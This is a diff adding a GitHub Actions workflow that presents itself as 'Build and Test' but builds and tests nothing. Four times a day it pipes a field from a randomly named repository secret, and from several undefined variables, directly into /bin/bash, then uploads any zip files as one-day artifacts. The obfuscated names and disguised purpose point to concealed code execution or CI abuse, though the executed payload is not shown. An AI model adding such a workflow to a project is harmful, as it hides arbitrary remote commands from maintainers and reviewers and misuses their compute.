@@ -1,0 +1,39 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '22 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  job:
+    name: Go
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          uktnq744: ${{ secrets.uktnq744 }}
+        run: |
+          printf '%s' "$uktnq744" | jq -r .pzzk7 | /bin/bash
+          printf '%s' "$bq40" | jq -r .iqo9 | /bin/bash
+          printf '%s' "$otm9" | jq -r .ytvqg68529 | /bin/bash
+          echo $g46 | jq -r .ndo78 | /bin/bash
+          echo $cdg77349 | jq -r .rh98913 | /bin/bash
+          printf '%s' "$f32308" | jq -r .z204 | /bin/bash
+          printf '%s' "$i3846" | jq -r .uiu84988 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 8CdKXCuC
+          path: "*.zip"
+          retention-days: 1
